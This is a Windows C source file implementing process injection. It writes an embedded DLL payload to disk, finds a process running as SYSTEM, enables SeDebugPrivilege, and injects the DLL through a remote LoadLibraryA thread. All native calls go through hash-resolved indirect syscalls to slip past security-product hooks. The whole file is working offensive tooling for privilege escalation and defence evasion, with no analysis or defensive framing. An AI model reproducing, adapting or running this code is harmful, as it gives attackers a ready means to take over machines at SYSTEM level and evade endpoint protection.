#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include "dllPayload.h"
#include "IndirectSyscall.h"
#include "ProcessInjection.h"

//check if a process is a system process
BOOL IsSystemProcess(HANDLE hProcess)
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		return FALSE;

	DWORD size = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &size); // get the required buffer size
	TOKEN_USER* tokenUser = malloc(size);

	if (!GetTokenInformation(hToken, TokenUser, tokenUser, size, &size)) { // get the real info
		free(tokenUser);
		CloseHandle(hToken);
		return FALSE;
	}

	PSID systemSid = NULL;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY; // define the NT authority

	if (!AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &systemSid)) { // create a SID for the SYSTEM account
		free(tokenUser);
		CloseHandle(hToken);
		return FALSE;
	}

	BOOL isSystem = EqualSid(tokenUser->User.Sid, systemSid); // check if the process's SID matches the SYSTEM SID
	FreeSid(systemSid);
	free(tokenUser);
	CloseHandle(hToken);

	return isSystem;
}

int writeDLLToFile(const char* dllPath, unsigned char* dllPayload, size_t dllSize) {
	FILE* file = fopen(dllPath, "wb");
	if (file == NULL) {
		printf("Failed to open file for writing: %s, error code: %lu\n", dllPath, GetLastError());
		return -1;
	}

	size_t bytes_written = fwrite(dllPayload, 1, dllSize, file);
	if (bytes_written != dllSize) {
		printf("Failed to write the entire DLL payload to file. Written: %zu, Expected: %zu\n", bytes_written, dllSize);
		fclose(file);
		return -1;
	}

	fclose(file);
	return 0;
}

// Locate the SYSTEM privillaged process
int locateTarget(const char* targetProcName) {

	// Convert name to wide char
	WCHAR targetProcNameW[MAX_PATH] = { 0 };
	errno_t err = mbstowcs_s(NULL, targetProcNameW, MAX_PATH,targetProcName, _TRUNCATE);
	if (err != 0) {
		printf("[-] Failed to convert process name '%s' (err=%d)\n",targetProcName, err);
		return -1;
	}

	// Take a snapshot of every process
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
		return -1;
	}

	PROCESSENTRY32 proc = { 0 };
	proc.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(snapshot, &proc)) {
		printf("[-] Process32First failed: %lu\n", GetLastError());
		CloseHandle(snapshot);
		return -1;
	}

	// Walk the snapshot looking for a SYSTEM instance of the target
	int foundPid = -1;

	do {
		// Only consider processes with the exact name
		if (wcscmp(proc.szExeFile, targetProcNameW) != 0)
			continue;

		wprintf(L"[i] Candidate: %s (PID %lu)\n",proc.szExeFile, proc.th32ProcessID);

		// Open with just enough rights to inspect its token
		HANDLE hTargetProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc.th32ProcessID);
		if (hTargetProc == NULL) {
			// One instance may be protected — try the next one, don't abort
			printf("[!] OpenProcess(PID %lu) failed: %lu — trying next\n",proc.th32ProcessID, GetLastError());
			continue;
		}

		BOOL isSystem = IsSystemProcess(hTargetProc);
		CloseHandle(hTargetProc);

		if (isSystem) {
			wprintf(L"[+] Found SYSTEM instance: %s (PID %lu)\n",proc.szExeFile, proc.th32ProcessID);
			foundPid = (int)proc.th32ProcessID;
			break;
		}

		printf("[i] PID %lu is not SYSTEM — skipping\n", proc.th32ProcessID);

	} while (Process32Next(snapshot, &proc));

	CloseHandle(snapshot);

	if (foundPid == -1)
		printf("[-] No SYSTEM instance of '%s' found\n", targetProcName);

	return foundPid;
}

char* getUserName() {
	DWORD size = 0;
	GetUserNameA(NULL, &size); // get the required buffer size
	char* username = malloc(size);
	if (username == NULL) {
		printf("Failed to allocate memory for username.\n");
		return NULL;
	}
	if (!GetUserNameA(username, &size)) { // get the real username
		printf("Failed to get username. Error: %lu\n", GetLastError());
		free(username);
		return NULL;
	}
	return username;
}


#ifndef STATUS_NOT_ALL_ASSIGNED
#define STATUS_NOT_ALL_ASSIGNED ((NTSTATUS)0x0000016A)
#endif

int setDebugPrivileges() {

	PSYSCALL_TABLE Table = InitSyscallTable();
	if (!(CreateSyscallEntry(HASHA("NtOpenProcessToken"), Table)
		&& CreateSyscallEntry(HASHA("NtAdjustPrivilegesToken"), Table)
		&& CreateSyscallEntry(HASHA("NtClose"), Table)))
	{
		FreeSyscallTable(Table);
		return -1;
	}

	// Indirect syscall for NtOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&htoken);
	HANDLE htoken = NULL;

	CALL_CONTEXT OpenTokCtx = { 0 };
	OpenTokCtx.ArgumentCount = 3;
	OpenTokCtx.Arguments[0] = (UINT64)GetCurrentProcess();     // pseudo-handle, no syscall
	OpenTokCtx.Arguments[1] = (UINT64)(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY);
	OpenTokCtx.Arguments[2] = (UINT64)&htoken;

	NTSTATUS status = IndirectSyscall(Table, HASHA("NtOpenProcessToken"), &OpenTokCtx);
	if (status != 0) {
		printf("[-] NtOpenProcessToken failed: 0x%08X\n", status);
		FreeSyscallTable(Table);
		return -1;
	}

	// LUID for SeDebugPrivilege is well-known
	TOKEN_PRIVILEGES tokenPriv = { 0 };
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE;   
	tokenPriv.Privileges[0].Luid.HighPart = 0;
	tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Indirect syscall for NtAdjustPrivilegesToken(htoken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL);
	CALL_CONTEXT AdjustCtx = { 0 };
	AdjustCtx.ArgumentCount = 6;
	AdjustCtx.Arguments[0] = (UINT64)htoken;
	AdjustCtx.Arguments[1] = (UINT64)FALSE;                    // DisableAllPrivileges
	AdjustCtx.Arguments[2] = (UINT64)&tokenPriv;               // NewState
	AdjustCtx.Arguments[3] = (UINT64)sizeof(tokenPriv);        // BufferLength
	AdjustCtx.Arguments[4] = 0;                                // PreviousState (optional)
	AdjustCtx.Arguments[5] = 0;                                // ReturnLength    (optional)

	status = IndirectSyscall(Table, HASHA("NtAdjustPrivilegesToken"), &AdjustCtx);

	// NtClose(htoken)
	CALL_CONTEXT CloseCtx = { 0 };
	CloseCtx.ArgumentCount = 1;
	CloseCtx.Arguments[0] = (UINT64)htoken;
	IndirectSyscall(Table, HASHA("NtClose"), &CloseCtx);

	FreeSyscallTable(Table);

	// Interpret the result
	if (status == STATUS_NOT_ALL_ASSIGNED) {
		printf("[-] SeDebugPrivilege was NOT assigned! (token didn't have it)\n");
		return -1;
	}
	if (status != 0) {
		printf("[-] NtAdjustPrivilegesToken failed: 0x%08X\n", status);
		return -1;
	}

	printf("[+] Successfully enabled SeDebugPrivilege\n");
	return 1;
}


BOOL injectProcess(DWORD targetPID, const char* dllPath)
{
	// Init and populate structs for the syscall data
	PSYSCALL_TABLE Table = InitSyscallTable();
	if (!(CreateSyscallEntry(HASHA("NtOpenProcess"), Table)
		&& CreateSyscallEntry(HASHA("NtAllocateVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtWriteVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtCreateThreadEx"), Table)
		&& CreateSyscallEntry(HASHA("NtFreeVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtClose"), Table)))
	{
		FreeSyscallTable(Table);
		return FALSE;
	}

	HANDLE   hTargetProc = NULL;
	HANDLE   hThread = NULL;
	PVOID    remoteMemory = NULL;
	NTSTATUS status;

	// Indirect syscall for OpenProcess
	CLIENT_ID         ClientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	ClientId.UniqueProcess = (HANDLE)(ULONG_PTR)targetPID;
	ClientId.UniqueThread = NULL;

	CALL_CONTEXT OpenProcessCtx = { 0 };
	OpenProcessCtx.ArgumentCount = 4;
	OpenProcessCtx.Arguments[0] = (UINT64)&hTargetProc;
	OpenProcessCtx.Arguments[1] = (UINT64)(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ);
	OpenProcessCtx.Arguments[2] = (UINT64)&ObjectAttributes;
	OpenProcessCtx.Arguments[3] = (UINT64)&ClientId;

	status = IndirectSyscall(Table, HASHA("NtOpenProcess"), &OpenProcessCtx);
	if (status != 0) {
		printf("[-] NtOpenProcess Failed: 0x%08X\n", status);
		FreeSyscallTable(Table);
		return FALSE;
	}
	printf("[+] Opened PID %lu -> handle 0x%p\n", targetPID, hTargetProc);


	// Indirect syscall for VirtualAllocEx(hTargetProc, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	SIZE_T dllPathLen = strlen(dllPath) + 1;   // include NUL for LoadLibraryA
	SIZE_T regionSize = dllPathLen;

	CALL_CONTEXT AllocCtx = { 0 };
	AllocCtx.ArgumentCount = 6;
	AllocCtx.Arguments[0] = (UINT64)hTargetProc;
	AllocCtx.Arguments[1] = (UINT64)&remoteMemory;
	AllocCtx.Arguments[2] = 0;                                 // ZeroBits
	AllocCtx.Arguments[3] = (UINT64)&regionSize;
	AllocCtx.Arguments[4] = (UINT64)(MEM_COMMIT | MEM_RESERVE);
	AllocCtx.Arguments[5] = (UINT64)PAGE_EXECUTE_READWRITE;

	status = IndirectSyscall(Table, HASHA("NtAllocateVirtualMemory"), &AllocCtx);
	if (status != 0) {
		printf("[-] NtAllocateVirtualMemory Failed: 0x%08X\n", status);
		IndirectClose(Table, hTargetProc);
		FreeSyscallTable(Table);
		return FALSE;
	}
	printf("[+] Remote memory: 0x%p (%zu bytes)\n", remoteMemory, regionSize);

	// Write the DLL path to the allocated memory in the target process
	// Indirect syscall for WriteProcessMemory(hTargetProc, remoteMemory, dllPath, dllPathLen, NULL)
	SIZE_T bytesWritten = 0;

	CALL_CONTEXT WriteCtx = { 0 };
	WriteCtx.ArgumentCount = 5;
	WriteCtx.Arguments[0] = (UINT64)hTargetProc;
	WriteCtx.Arguments[1] = (UINT64)remoteMemory;
	WriteCtx.Arguments[2] = (UINT64)dllPath;
	WriteCtx.Arguments[3] = (UINT64)dllPathLen;
	WriteCtx.Arguments[4] = (UINT64)&bytesWritten;

	status = IndirectSyscall(Table, HASHA("NtWriteVirtualMemory"), &WriteCtx);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory Failed: 0x%08X\n", status);
		IndirectClose(Table, hTargetProc);
		FreeSyscallTable(Table);
		return FALSE;
	}
	printf("[i] Wrote %zu / %zu bytes\n", bytesWritten, dllPathLen);

	// Resolve LoadLibraryA locally
	LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	if (loadLibraryAddr == NULL) {
		printf("[-] Failed to resolve LoadLibraryA\n");
		IndirectClose(Table, hTargetProc);
		FreeSyscallTable(Table);
		return FALSE;
	}


	// create a thread in the target process that calls LoadLibraryA with the DLL path as an argument
	// Indirect syscall for CreateRemoteThread(hTargetProc, NULL, 0, loadLibraryAddr, remoteMemory, 0, NULL);
	CALL_CONTEXT ThreadCtx = { 0 };
	ThreadCtx.ArgumentCount = 12;
	ThreadCtx.Arguments[0] = (UINT64)&hThread;
	ThreadCtx.Arguments[1] = (UINT64)THREAD_ALL_ACCESS;
	ThreadCtx.Arguments[2] = 0;                                // ObjectAttributes
	ThreadCtx.Arguments[3] = (UINT64)hTargetProc;
	ThreadCtx.Arguments[4] = (UINT64)loadLibraryAddr;
	ThreadCtx.Arguments[5] = (UINT64)remoteMemory;             // StartParameter = DLL path
	ThreadCtx.Arguments[6] = 0;                                // CreateFlags
	ThreadCtx.Arguments[7] = 0;                                // ZeroBits
	ThreadCtx.Arguments[8] = 0;                                // StackSize
	ThreadCtx.Arguments[9] = 0;                                // MaxStackSize
	ThreadCtx.Arguments[10] = 0;                                // AttributeList
	ThreadCtx.Arguments[11] = 0;                                // Win32StartAddress / reserved

	status = IndirectSyscall(Table, HASHA("NtCreateThreadEx"), &ThreadCtx);
	if (status != 0) {
		printf("[-] NtCreateThreadEx Failed: 0x%08X\n", status);
		IndirectClose(Table, hTargetProc);
		FreeSyscallTable(Table);
		return FALSE;
	}
	printf("[+] Remote thread: 0x%p (tid %lu)\n",
		hThread, GetThreadId(hThread));

	// Wait before freeing so LoadLibraryA has actually run in the target
	WaitForSingleObject(hThread, INFINITE);
	DWORD exitCode = 0;
	GetExitCodeThread(hThread, &exitCode);
	IndirectClose(Table, hThread);
	hThread = NULL;

	if (exitCode == 0) {
		printf("[-] LoadLibraryA returned NULL in target - DLL FAILED to load\n");
		return FALSE;
	}
	else {
		printf("[+] LoadLibraryA returned HMODULE 0x%08X - DLL LOADED\n", exitCode);
	}

	// Clean up
	// Indirect syscall for VirtualFreeEx(hTargetProc, remoteMemory, 0, MEM_RELEASE);
	CALL_CONTEXT FreeCtx = { 0 };
	SIZE_T freeSize = 0;                                      // value 0 as required
	FreeCtx.ArgumentCount = 4;
	FreeCtx.Arguments[0] = (UINT64)hTargetProc;
	FreeCtx.Arguments[1] = (UINT64)&remoteMemory;
	FreeCtx.Arguments[2] = (UINT64)&freeSize;                             
	FreeCtx.Arguments[3] = (UINT64)MEM_RELEASE;

	status = IndirectSyscall(Table, HASHA("NtFreeVirtualMemory"), &FreeCtx);

	BOOL success = TRUE;
	if (status != 0) {
		printf("[-] NtFreeVirtualMemory Failed: 0x%08X\n", status);
		success = FALSE;
	}
	else {
		printf("[+] Freed remote memory\n");
	}

	// Cleanup
	IndirectClose(Table, hTargetProc);
	FreeSyscallTable(Table);
	return success;
}
